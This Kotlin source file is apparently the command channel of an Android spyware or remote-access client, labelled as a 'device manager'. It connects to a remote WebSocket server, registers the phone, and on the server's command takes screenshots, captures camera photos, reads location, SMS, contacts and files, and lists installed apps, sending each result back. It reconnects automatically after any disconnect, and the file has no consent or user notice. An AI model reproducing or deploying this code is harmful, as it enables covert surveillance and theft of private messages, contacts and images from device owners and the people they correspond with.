package com.devicemanager

import android.os.Build
import android.util.Log
import com.google.gson.Gson
import org.java_websocket.client.WebSocketClient as JavaWebSocketClient
import org.java_websocket.handshake.ServerHandshake
import java.net.URI

class WebSocketClient(
    private val serverUrl: String,
    private val commandHandler: CommandHandler
) {

    private var client: JavaWebSocketClient? = null
    private val gson = Gson()
    private val TAG = "WebSocketClient"

    fun connect() {
        try {
            val wsUrl = serverUrl.replace("http://", "ws://").replace("https://", "wss://")
            val uri = URI(wsUrl)

            client = object : JavaWebSocketClient(uri) {
                override fun onOpen(handshakedata: ServerHandshake?) {
                    Log.d(TAG, "Connected to server")
                    sendDeviceInfo()
                }

                override fun onMessage(message: String?) {
                    message?.let { handleMessage(it) }
                }

                override fun onClose(code: Int, reason: String?, remote: Boolean) {
                    Log.d(TAG, "Disconnected: $reason")
                    reconnect()
                }

                override fun onError(ex: Exception?) {
                    Log.e(TAG, "Error: ${ex?.message}")
                }
            }

            client?.connect()
        } catch (e: Exception) {
            Log.e(TAG, "Connection error: ${e.message}")
        }
    }

    private fun handleMessage(message: String) {
        try {
            val data = gson.fromJson(message, Map::class.java)
            val type = data["type"] as? String ?: return
            val command = data["command"] as? String ?: return

            when (command) {
                "screenshot" -> commandHandler.takeScreenshot { result ->
                    sendResponse(type, result)
                }
                "location" -> commandHandler.getLocation { result ->
                    sendResponse(type, result)
                }
                "camera" -> {
                    val camera = data["camera"] as? String ?: "front"
                    commandHandler.takePhoto(camera) { result ->
                        sendResponse(type, result)
                    }
                }
                "sms" -> commandHandler.getSMS { result ->
                    sendResponse(type, result)
                }
                "contacts" -> commandHandler.getContacts { result ->
                    sendResponse(type, result)
                }
                "files" -> commandHandler.getFiles { result ->
                    sendResponse(type, result)
                }
                "apps" -> commandHandler.getInstalledApps { result ->
                    sendResponse(type, result)
                }
                else -> Log.d(TAG, "Unknown command: $command")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Message handling error: ${e.message}")
        }
    }

    private fun sendDeviceInfo() {
        val deviceInfo = mapOf(
            "type" to "register",
            "deviceId" to Build.ID,
            "model" to Build.MODEL,
            "manufacturer" to Build.MANUFACTURER,
            "androidVersion" to Build.VERSION.RELEASE
        )
        send(gson.toJson(deviceInfo))
    }

    private fun sendResponse(type: String, data: Any) {
        val response = mapOf(
            "type" to type,
            "data" to data
        )
        send(gson.toJson(response))
    }

    fun send(message: String) {
        try {
            client?.send(message)
        } catch (e: Exception) {
            Log.e(TAG, "Send error: ${e.message}")
        }
    }

    fun disconnect() {
        client?.close()
    }

    private fun reconnect() {
        Thread.sleep(5000)
        connect()
    }
}
